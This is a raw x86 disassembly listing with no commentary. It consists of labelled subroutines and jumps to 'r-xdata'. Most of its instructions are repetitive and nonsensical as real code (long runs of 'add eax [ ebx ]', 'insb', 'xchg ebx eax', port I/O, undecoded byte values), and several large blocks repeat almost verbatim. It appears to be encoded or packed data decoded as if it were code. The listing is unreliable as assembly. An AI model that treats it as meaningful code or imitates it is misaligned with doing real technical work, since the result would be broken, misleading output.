add [ edi - 0x1a936c6d ] bl
sub_466afc
cmc
sbb dl dh
outsd
mov al [ 0xffffffffd61af553 ]
insd
sti
xchg edi eax
xchg edx eax
xchg ebx eax
xchg ebx eax
push ds
push ss
and ebp [ esi + 0x6c ]
insb
retn
sub_466ba9
cmc
sbb bl dh
sbb [ gs : ebx - 0xb ] bl
sbb bl dh
imul ecx edx 0xfffffff5
sbb bl dh
imul edi [ edx - 0x37 ] 0x393938e
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
push ss
dec ebx
outsb
insb
insb
test al 0xd6
fwait
pushfd
pop ss
pop ebp
inc edx
insb
insb
push ds
push ss
inc ebx
outsb
insb
insb
retn
sub_466bdf
inc edx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push esp
salc
outsd
jmp eax
sub_466c9b
cmc
sbb cl dh
aas
enter 0x1af5 0xce
cmp eax 0x6c4e407a
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
pop ss
mov bh 0xb
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
sub_466cb9
push ebp
xlat
mov bh 0xa4
mov [ 0x6c57f77a ] eax
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb ch dh
and [ eax ] ebx
imul edi ecx 0xee1af5eb
daa
int3
sub_466d2c
sbb dh dl
fwait
jpe r-xdata
into
jbe r-xdata
insb
insb
jpe r-xdata
jne r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
xor [ edx ] ebx
into
outsd
sbb bl dh
sbb al dh
imul ebx [ eax ] 0xffffffd6
outsd
jpe r-xdata
insb
add ebx [ esi + edx - 0x6c6c6423 ]
push ds
salc
pop es
retn
imul ebx [ eax ] 0xce1af54b
outsd
mov al [ 0xffffffff9d537a48 ]
xchg ebx eax
xchg ebx eax
add eax ebx
jpe r-xdata
cmc
sbb cl dh
imul ebx [ eax ] 0x4d
cmc
sbb cl dh
dec ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx - 0x6c6c6c6c ]
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push edx
imul ecx [ ebx + edi - 0x1be8636e ] 0x68
insb
insb
mov al [ 0x357ad353 ]
mov [ ebx + 0x3030393 ] edx
adc [ ebx + 0x3030393 ] 0x3
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
xchg edi eax
rol al 0x7a
mov [ edx + 0x6c ] esi
insb
add eax [ ebx ]
insb
salc
outsd
adc dh ch
outsd
nop
jpe r-xdata
sar [ edx - 0x77 ] 0x72
insb
dec esp
insb
insb
adc [ edi - 0x2d ] dl
sti
cmp al 0xa7
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ edx + 0x6b ]
jae r-xdata
dec ebp
insb
insb
sti
adc ch al
scasb [ edi ]
mov al 0xc4
sbb dl ch
out dx eax
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
les ebx [ edx ]
aad 0xd7
jpo r-xdata
push ecx
insb
insb
add eax [ ebx ]
add ebx [ esi ]
salc
retn
sub_466e3f
add ah al
sbb dl ch
mov [ 0x6c4d637b ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
les ebx [ edx ]
aad 0xd7
jpo r-xdata
push ecx
insb
insb
add eax [ ebx ]
add ebx [ esi ]
salc
retn
sar [ edx - 0x77 ] 0x72
insb
insb
add eax [ ebx ]
insb
salc
outsd
adc dh ch
outsd
nop
jpe r-xdata
dec esp
insb
insb
adc [ edi - 0x2d ] dl
sti
cmp al 0xa7
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ edx + 0x6b ]
jae r-xdata
insb
sti
adc ch al
scasb [ edi ]
mov al 0xc4
sbb dl ch
out dx eax
jpe r-xdata
dec ebp
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push edx
imul ecx [ ebx + edi - 0x1be8636e ] 0x68
insb
insb
mov al [ 0x357ad353 ]
mov [ ebx + 0x3030393 ] edx
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sub_466e5e
stc
insb
insb
out 0x7f al
sbb cl dh
les edi [ bp + si - 0x39 ]
xchg ebp eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add edx [ esi ]
push ebx
pushfd
push ss
retn
sub_466e91
insb
insb
sbb [ ebx + 0x1e ] bl
push ss
adc ebp [ esi + 0x6c ]
insb
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
dec ebx
push eax
mov edx [ ebx + 0x77d61e93 ]
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ eax - 0x6eadef9e ]
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ ebx + ecx * 2 + 0x50 ]
insb
insb
add ebp [ esi - 0x7d ]
insb
add al 0x67
xchg ebx eax
xchg ebx eax
xchg ebx eax
int3
sub_466ea5
push ds
salc
sbb eax ebx
sar [ edx + 0x6e ] 0x68
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x65 ]
sub eax 0x3036c6c
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
dec ebp
insb
insb
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ ebx + ecx * 2 + 0x50 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ eax - 0x6eadef9e ]
jpe r-xdata
insb
insb
add ebp [ esi - 0x7d ]
insb
add al 0x67
xchg ebx eax
xchg ebx eax
xchg ebx eax
int3
jpo r-xdata
mov dl [ ebx - 0x7485fc6d ]
push edx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sub_466f81
push esp
insb
insb
insb
out 0x9b al
push ds
push ss
jpo r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax edx
retn
insb
insb
insb
out 0x87 al
retn
sub_466f91
insb
add al 0x7f
xchg ebx eax
xchg ebx eax
xchg ebx eax
adc [ edi - 0x61 ] dl
push ds
push ss
jg r-xdata
xchg ebx eax
sti
xchg ebx eax
adc edx [ ebx + 0x6c93f993 ]
out 0xb7 eax
mov ebp [ ebp + eax * 8 - 0x19 ]
pushfd
and eax 0xd76c97d4
mov bh 0x8b
stosb [ edi ]
xlat
mov bh 0x8b
pushfd
adc [ eax + 0x78 ] edi
insb
insb
pushfd
and al 0xd0
insb
insb
retn
sub_466fe7
sbb dl dh
jne r-xdata
salc
sbb bl dh
jae r-xdata
insb
insb
out 0x9b al
push ds
push ss
jpo r-xdata
push ebx
stc
jmp r-xdata
fiadd [ edi - 0x36 ]
stc
jmp sub_466fb4
push ds
salc
jpo r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax edx
retn
insb
insb
insb
out 0x87 al
retn
ja r-xdata
sbb [ ebx - 0xb ] bl
out 0xf5 eax
sbb bl dh
inc edi
0xebf9
sbb dh dl
fwait
jpe r-xdata
sbb dl dh
push ebx
insb
sub_467057
pop eax
insb
insb
push ds
aam 0x92
jpe r-xdata
add eax [ ebx ]
add ebx [ esi ]
ja r-xdata
add eax [ ebx ]
sbb dh bl
xchg [ ebx + 0x4d ] edi
test [ ebx - 0x7c29e16d ] edx
retn
inc esi
insb
insb
insb
adc eax 0x9393932f
push ds
push ss
inc edi
outsb
insb
insb
jpe r-xdata
ficomp [ ebx + 0x7b83e61e ]
loope r-xdata
salc
inc edi
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
add eax [ ebx ]
add eax [ ebx ]
retn 0x147a
push esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax edx
jpe r-xdata
mov [ 0xfffffffff5915210 ] eax
push ss
jpe r-xdata
insb
insb
jpe r-xdata
xchg ebp eax
xchg ebx eax
xchg ecx eax
xchg ebx eax
rcr [ esi ] 0x16
jg r-xdata
push 0x3036c6c
sti
sbb dh ah
out dx eax
jpe r-xdata
xchg edx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb ah dh
inc eax
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax * 8 - 0x5d ]
push ds
push ss
pop ebx
outsb
insb
insb
retn
jae r-xdata
insb
insb
retn
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0xffffffff9c53165a ]
or dl [ edx + 0x18 ]
push edx
pop edx
jns r-xdata
pop ecx
cmc
sbb bl dh
pop edi
jpo r-xdata
insb
0x5316
push ss
push ebx
jpe r-xdata
xchg ebx eax
xchg ebx eax
mov al [ 0x40247a5a ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
sbb [ edx + 0x16 ] ah
sbb [ edx + 0x5a ] dl
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
salc
inc edi
cmc
sbb ah dh
pop ebp
sbb dh ah
fwait
cmc
sbb cl dh
sub ebx [ eax ]
dec ecx
retn
push ds
salc
dec edi
retn
jae r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ ebx + 0x3030393 ] 0x3
pushfd
pop ss
jg r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
lds ebx [ eax ]
bound edx [ esi ]
inc ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb cl dh
xchg ecx eax
enter 0x1af5 0xce
xchg edi eax
stc
movsd [ edi ] [ esi ]
enter 0x1af5 0xce
xchg ebp eax
stc
cmpsd [ esi ] [ edi ]
enter 0x1af5 0xce
fwait
sbb [ ebp - 0xb ] cl
sbb cl dh
cdq
jpe r-xdata
insb
0x5316
jpe r-xdata
ja r-xdata
cmc
sub edx [ edx + 0x1a319c93 ]
inc ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax + 0x3f ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb [ 0xffffffff9393932f ] dl
insb
add eax esp
les edi [ edx + 0x76 ]
jne r-xdata
jpe r-xdata
lahf
xchg ebx eax
xchg ebx eax
sbb [ 0xffffffff9393932f ] dl
sbb [ 0xffffffff93939353 ] bl
cli
push ebx
pop ss
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb [ esi ] al
dec edi
outsb
insb
insb
sbb al [ edi ]
fwait
adc edx [ ebx + 0x15189393 ]
das
xchg ebx eax
xchg ebx eax
xchg ebx eax
push ds
push ds
imul ebp [ esi + 0x6c ] 0x6c
add eax [ ebx ]
add eax [ ebx ]
insb
add eax 0x9393933f
jl r-xdata
insb
add eax [ ebx ]
add edx [ edx ]
jg r-xdata
and edx [ ecx + 0x6c ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x5d ]
xchg edi eax
xchg ebx eax
xchg ebx eax
adc dh dh
ja r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ esi + 0x77 ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
add eax [ ebx ]
insb
inc eax
sbb [ ebp + 0x7a ] dl
pop esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ ebx + 0x6c ] ch
pushfd
push ss
insb
outsb
insb
insb
stc
xchg edx eax
push ds
xlat
mov bh 0xbc
jpe r-xdata
fidiv [ edi + 0x7a ]
cmc
shl ch 0x2b
xchg edx eax
xchg ebx eax
pushfd
xor [ edx ] ebx
add eax [ ebx ]
add esi ebp
sbb dl dh
dec ebx
jpe r-xdata
arpl [ esp + ebp * 2 + 0x3 ] bp
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edx ]
salc
jpe r-xdata
jpo r-xdata
outsb
insb
insb
jae r-xdata
jpe r-xdata
js r-xdata
fisubr [ esp + 0x57 ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
insb
stc
test ecx 0x6c48837a
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ ebx - 0x7 ] ch
test esp 0x9323056c
xchg ebx eax
xchg ebx eax
sar [ edx + 0x23 ] 0x51
insb
xchg ebx eax
jpo r-xdata
sbb [ ebx + edi * 2 + 0x69 ] dl
nop
xchg ebx eax
xchg ebx eax
0x53a0
add eax [ ebx ]
add eax [ ebx ]
insb
out 0x77 al
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx ebx
jpe r-xdata
0x5aca
pop ebp
insb
insb
adc [ edi - 0x79 ] dl
sti
xchg edx eax
xchg ebx eax
xchg ebx eax
insb
les ebx [ ebx - 0x64481894 ]
insb
les edi [ edi + 0x46c93f9 ]
aas
xchg ebx eax
xchg ebx eax
xchg ebx eax
int3
inc ebp
insb
insb
sub_4670a6
sti
xchg ebp eax
xchg ebx eax
xchg ecx eax
xchg ebx eax
rcr [ esi ] 0x16
jg r-xdata
jae r-xdata
insb
insb
retn
pop ecx
cmc
sbb bl dh
pop edi
jpo r-xdata
insb
0x5316
push ds
salc
dec edi
retn
jae r-xdata
xchg ebx eax
xchg ebx eax
mov al [ 0x40247a5a ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
0x5316
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
lds ebx [ eax ]
bound edx [ esi ]
inc ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb cl dh
xchg ecx eax
enter 0x1af5 0xce
xchg edi eax
stc
movsd [ edi ] [ esi ]
enter 0x1af5 0xce
xchg ebp eax
stc
cmpsd [ esi ] [ edi ]
enter 0x1af5 0xce
fwait
sbb [ ebp - 0xb ] cl
sbb cl dh
cdq
jpe r-xdata
push ss
push ebx
jpe r-xdata
jpe r-xdata
ja r-xdata
pushfd
pop ss
jg r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0xffffffff9c53165a ]
or dl [ edx + 0x18 ]
push edx
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
sbb [ edx + 0x16 ] ah
adc [ ebx + 0x3030393 ] 0x3
cmc
sub edx [ edx + 0x1a319c93 ]
inc ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax + 0x3f ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb [ 0xffffffff9393932f ] dl
insb
add eax esp
les edi [ edx + 0x76 ]
jne r-xdata
jpe r-xdata
lahf
xchg ebx eax
xchg ebx eax
sbb [ 0xffffffff9393932f ] dl
sbb [ 0xffffffff93939353 ] bl
cli
push ebx
pop ss
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb [ esi ] al
dec edi
outsb
insb
insb
sbb al [ edi ]
fwait
adc edx [ ebx + 0x15189393 ]
das
xchg ebx eax
xchg ebx eax
xchg ebx eax
push ds
push ds
imul ebp [ esi + 0x6c ] 0x6c
add eax [ ebx ]
add eax [ ebx ]
insb
add eax 0x9393933f
jl r-xdata
insb
add eax [ ebx ]
add edx [ edx ]
jg r-xdata
and edx [ ecx + 0x6c ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x5d ]
xchg edi eax
xchg ebx eax
xchg ebx eax
adc dh dh
ja r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ esi + 0x77 ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
add eax [ ebx ]
insb
inc eax
sbb [ ebp + 0x7a ] dl
pop esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ ebx + 0x6c ] ch
pushfd
push ss
insb
outsb
insb
insb
stc
xchg edx eax
push ds
xlat
mov bh 0xbc
jpe r-xdata
fidiv [ edi + 0x7a ]
cmc
shl ch 0x2b
xchg edx eax
xchg ebx eax
pushfd
xor [ edx ] ebx
add eax [ ebx ]
add esi ebp
sbb dl dh
dec ebx
jpe r-xdata
arpl [ esp + ebp * 2 + 0x3 ] bp
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edx ]
salc
jpe r-xdata
jpo r-xdata
outsb
insb
insb
jae r-xdata
jpe r-xdata
js r-xdata
fisubr [ esp + 0x57 ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
insb
stc
test ecx 0x6c48837a
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ ebx - 0x7 ] ch
test esp 0x9323056c
xchg ebx eax
xchg ebx eax
sar [ edx + 0x23 ] 0x51
insb
xchg ebx eax
jpo r-xdata
sbb [ ebx + edi * 2 + 0x69 ] dl
nop
xchg ebx eax
xchg ebx eax
0x53a0
add eax [ ebx ]
add eax [ ebx ]
insb
out 0x77 al
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx ebx
jpe r-xdata
0x5aca
pop ebp
insb
insb
adc [ edi - 0x79 ] dl
sti
xchg edx eax
xchg ebx eax
xchg ebx eax
insb
les ebx [ ebx - 0x64481894 ]
insb
les edi [ edi + 0x46c93f9 ]
aas
xchg ebx eax
xchg ebx eax
xchg ebx eax
int3
inc ebp
insb
insb
sub_4670c6
insd
insb
insb
insb
out 0x9f al
sbb dh bl
fwait
push ds
out 0x83 al
jpo r-xdata
xchg ebx eax
xchg ebx eax
adc ebx [ edx ]
into
sub [ esp + eax + 0x6b ] 0xffffff93
xchg ebx eax
xchg ebx eax
push ss
push ebx
pushfd
push ss
imul ebp [ esp + ebp * 2 + 0x7a ] 0x6c6c406f
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax * 8 - 0x5d ]
push ds
push ss
pop ebx
outsb
insb
insb
retn
sub_4670f1
insb
lds edi [ edi + 0x7a83ceab ]
into
mov dl [ ebx + 0x3030393 ]
add eax [ ebx ]
add eax [ ebx ]
push ds
push ds
and ebp [ esi + 0x6c ]
insb
jpe r-xdata
insb
test [ ebx - 0x63fcfc6d ] dl
push ss
xchg [ ebx - 0x29e16c6d ] edx
dec edi
retn
sub_46711a
sbb [ ebp + 0x7b ] dl
push ss
jae r-xdata
pop ecx
cmc
sbb bl dh
pop edi
jpo r-xdata
insb
0x5316
push ds
salc
dec edi
retn
jae r-xdata
xchg ebx eax
xchg ebx eax
mov al [ 0x40247a5a ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
0x5316
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
lds ebx [ eax ]
bound edx [ esi ]
inc ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb cl dh
xchg ecx eax
enter 0x1af5 0xce
xchg edi eax
stc
movsd [ edi ] [ esi ]
enter 0x1af5 0xce
xchg ebp eax
stc
cmpsd [ esi ] [ edi ]
enter 0x1af5 0xce
fwait
sbb [ ebp - 0xb ] cl
sbb cl dh
cdq
jpe r-xdata
push ss
push ebx
jpe r-xdata
jpe r-xdata
ja r-xdata
pushfd
pop ss
jg r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0xffffffff9c53165a ]
or dl [ edx + 0x18 ]
push edx
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
sbb [ edx + 0x16 ] ah
adc [ ebx + 0x3030393 ] 0x3
cmc
sub edx [ edx + 0x1a319c93 ]
inc ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax + 0x3f ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb [ 0xffffffff9393932f ] dl
insb
add eax esp
les edi [ edx + 0x76 ]
jne r-xdata
jpe r-xdata
lahf
xchg ebx eax
xchg ebx eax
sbb [ 0xffffffff9393932f ] dl
sbb [ 0xffffffff93939353 ] bl
cli
push ebx
pop ss
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb [ esi ] al
dec edi
outsb
insb
insb
sbb al [ edi ]
fwait
adc edx [ ebx + 0x15189393 ]
das
xchg ebx eax
xchg ebx eax
xchg ebx eax
push ds
push ds
imul ebp [ esi + 0x6c ] 0x6c
add eax [ ebx ]
add eax [ ebx ]
insb
add eax 0x9393933f
jl r-xdata
insb
add eax [ ebx ]
add edx [ edx ]
jg r-xdata
and edx [ ecx + 0x6c ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x5d ]
xchg edi eax
xchg ebx eax
xchg ebx eax
adc dh dh
ja r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ esi + 0x77 ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
add eax [ ebx ]
insb
inc eax
sbb [ ebp + 0x7a ] dl
pop esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ ebx + 0x6c ] ch
pushfd
push ss
insb
outsb
insb
insb
stc
xchg edx eax
push ds
xlat
mov bh 0xbc
jpe r-xdata
fidiv [ edi + 0x7a ]
cmc
shl ch 0x2b
xchg edx eax
xchg ebx eax
pushfd
xor [ edx ] ebx
add eax [ ebx ]
add esi ebp
sbb dl dh
dec ebx
jpe r-xdata
arpl [ esp + ebp * 2 + 0x3 ] bp
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edx ]
salc
jpe r-xdata
jpo r-xdata
outsb
insb
insb
jae r-xdata
jpe r-xdata
js r-xdata
fisubr [ esp + 0x57 ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
insb
stc
test ecx 0x6c48837a
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ ebx - 0x7 ] ch
test esp 0x9323056c
xchg ebx eax
xchg ebx eax
sar [ edx + 0x23 ] 0x51
insb
xchg ebx eax
jpo r-xdata
sbb [ ebx + edi * 2 + 0x69 ] dl
nop
xchg ebx eax
xchg ebx eax
